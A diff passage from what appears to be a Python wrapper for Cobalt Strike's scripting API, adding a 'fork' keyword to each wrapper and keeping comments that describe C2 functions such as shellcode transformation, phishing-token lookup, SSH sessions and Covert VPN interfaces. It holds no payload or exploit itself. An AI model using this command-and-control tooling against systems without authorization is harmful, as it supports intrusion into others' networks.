 # Returns a list of sites tied to Cobalt Strike's web server.
@@ -3992,8 +3992,8 @@ def site_kill(*args):
 # 
 # printAll(sites());
 # 
-def sites(*args):
-    return engine.call('sites', args)
+def sites(*args, fork=False):
+    return engine.call('sites', args, fork=fork)
 
 # 
 # Describe an SSH command.
@@ -4005,8 +4005,8 @@ def sites(*args):
 # 
 # println(beacon_command_describe("sudo"));
 # 
-def ssh_command_describe(*args):
-    return engine.call('ssh_command_describe', args)
+def ssh_command_describe(*args, fork=False):
+    return engine.call('ssh_command_describe', args, fork=fork)
 
 # 
 # Get the help information for an SSH command.
@@ -4018,8 +4018,8 @@ def ssh_command_describe(*args):
 # 
 # println(ssh_command_detail("sudo"));
 # 
-def ssh_command_detail(*args):
-    return engine.call('ssh_command_detail', args)
+def ssh_command_detail(*args, fork=False):
+    return engine.call('ssh_command_detail', args, fork=fork)
 
 # 
 # Register help information for an SSH console command.
@@ -4038,8 +4038,8 @@ def ssh_command_detail(*args):
 # 	"echo posts to the current session's log",
 # 	"Synopsis: echo [arguments]\n\nLog arguments to the SSH console");
 # 
-def ssh_command_register(*args):
-    return engine.call('ssh_command_register', args)
+def ssh_command_register(*args, fork=False):
+    return engine.call('ssh_command_register', args, fork=fork)
 
 # 
 # Get a list of SSH commands.
@@ -4049,8 +4049,8 @@ def ssh_command_register(*args):
 # 
 # printAll(ssh_commands());
 # 
-def ssh_commands(*args):
-    return engine.call('ssh_commands', args)
+def ssh_commands(*args, fork=False):
+    return engine.call('ssh_commands', args, fork=fork)
 
 # 
 # Chunk a string into multiple parts
@@ -4068,8 +4068,8 @@ def ssh_commands(*args):
 # 	return strrep($data, '%%DATA%%', join("' + '", $enc));
 # }
 # 
-def str_chunk(*args):
-    return engine.call('str_chunk', args)
+def str_chunk(*args, fork=False):
+    return engine.call('str_chunk', args, fork=fork)
 
 # 
 # Convert a string of bytes to text with the specified encoding.
@@ -4083,8 +4083,8 @@ def str_chunk(*args):
 # # convert back to a string we can use (from UTF16-LE)
 # $text = str_decode($string, "UTF16-LE");
 # 
-def str_decode(*args):
-    return engine.call('str_decode', args)
+def str_decode(*args, fork=False):
+    return engine.call('str_decode', args, fork=fork)
 
 # 
 # Convert text to byte string with the specified character encoding.
@@ -4098,8 +4098,8 @@ def str_decode(*args):
 # # convert to UTF16-LE
 # $encoded = str_encode("this is some text", "UTF16-LE");
 # 
-def str_encode(*args):
-    return engine.call('str_encode', args)
+def str_encode(*args, fork=False):
+    return engine.call('str_encode', args, fork=fork)
 
 # 
 # Sync a downloaded file (View -> Downloads) to a local path.
@@ -4121,8 +4121,8 @@ def str_encode(*args):
 # 	}
 # }
 # 
-def sync_download(*args):
-    return engine.call('sync_download', args)
+def sync_download(*args, fork=False):
+    return engine.call('sync_download', args, fork=fork)
 
 # 
 # Returns a list of host information in Cobalt Strike's data model.
@@ -4132,8 +4132,8 @@ def sync_download(*args):
 # 
 # printAll(targets());
 # 
-def targets(*args):
-    return engine.call('targets', args)
+def targets(*args, fork=False):
+    return engine.call('targets', args, fork=fork)
 
 # 
 # Generate the target browser GUI component.
@@ -4146,8 +4146,8 @@ def targets(*args):
 # See Also
 # &showVisualization
 # 
-def tbrowser(*args):
-    return engine.call('tbrowser', args)
+def tbrowser(*args, fork=False):
+    return engine.call('tbrowser', args, fork=fork)
 
 # 
 # Covert a phishing token to an email address.
@@ -4167,8 +4167,8 @@ def tbrowser(*args):
 # 	return "$out $+ \n\n";
 # }
 # 
-def tokenToEmail(*args):
-    return engine.call('tokenToEmail', args)
+def tokenToEmail(*args, fork=False):
+    return engine.call('tokenToEmail', args, fork=fork)
 
 # 
 # Transform shellcode into another format.
@@ -4211,8 +4211,8 @@ def tokenToEmail(*args):
 # 
 # println(transform("This is a test!", "veil"));
 # 
-def transform(*args):
-    return engine.call('transform', args)
+def transform(*args, fork=False):
+    return engine.call('transform', args, fork=fork)
 
 # 
 # Transform shellcode into a VBS expression that results in a string
@@ -4231,8 +4231,8 @@ def transform(*args):
 # 
 # println(transform_vbs("This is a test!", "3"));
 # 
-def transform_vbs(*args):
-    return engine.call('transform_vbs', args)
+def transform_vbs(*args, fork=False):
+    return engine.call('transform_vbs', args, fork=fork)
 
 # 
 # Format a time into a date/time value. This value does not include seconds.
@@ -4244,8 +4244,8 @@ def transform_vbs(*args):
 # 
 # See Also
 # &dstamp
-def tstamp(*args):
-    return engine.call('tstamp', args)
+def tstamp(*args, fork=False):
+    return engine.call('tstamp', args, fork=fork)
 
 # 
 # Open a URL in the default browser.
@@ -4257,8 +4257,8 @@ def tstamp(*args):
 # 	url_open("https://www.cobaltstrike.com/");
 # }
 # 
-def url_open(*args):
-    return engine.call('url_open', args)
+def url_open(*args, fork=False):
+    return engine.call('url_open', args, fork=fork)
 
 # 
 # Returns a list of users connected to this team server.
@@ -4270,8 +4270,8 @@ def url_open(*args):
 # 	println($user);
 # }
 # 
-def users(*args):
-    return engine.call('users', args)
+def users(*args, fork=False):
+    return engine.call('users', args, fork=fork)
 
 # 
 # Get information about a VPN interface.
@@ -4297,8 +4297,8 @@ def users(*args):
 # 	}
 # }
 # 
-def vpn_interface_info(*args):
-    return engine.call('vpn_interface_info', args)
+def vpn_interface_info(*args, fork=False):
+    return engine.call('vpn_interface_info', args, fork=fork)
 
 # 
 # Return a list of VPN interface names
@@ -4308,8 +4308,8 @@ def vpn_interface_info(*args):
 # 
 # printAll(vpn_interfaces());
 # 
-def vpn_interfaces(*args):
-    return engine.call('vpn_interfaces', args)
+def vpn_interfaces(*args, fork=False):
+    return engine.call('vpn_interfaces', args, fork=fork)
 
 # 
 # Create a Covert VPN interface on the team server system.
@@ -4323,8 +4323,8 @@ def vpn_interfaces(*args):
 # 
 # vpn_tap_create("phear0", $null, $null, 7324, "udp");
 # 
-def vpn_tap_create(*args):
-    return engine.call('vpn_tap_create', args)
+def vpn_tap_create(*args, fork=False):
+    return engine.call('vpn_tap_create', args, fork=fork)
 
 # 
 # Destroy a Covert VPN interface
@@ -4334,14 +4334,14 @@ def vpn_tap_create(*args):
 # 
 # vpn_tap_destroy("phear0");
 # 
-def vpn_tap_delete(*args):
-    return engine.call('vpn_tap_delete', args)
+def vpn_tap_delete(*args, fork=False):
+    return engine.call('vpn_tap_delete', args, fork=fork)
 
 
-def print(*args):
-    return engine.call('print', args)
+def print(*args, fork=False):
+    return engine.call('print', args, fork=fork)
 
 
-def println(*args):
-    return engine.call('println', args)
+def println(*args, fork=False):
+    return engine.call('println', args, fork=fork)
 
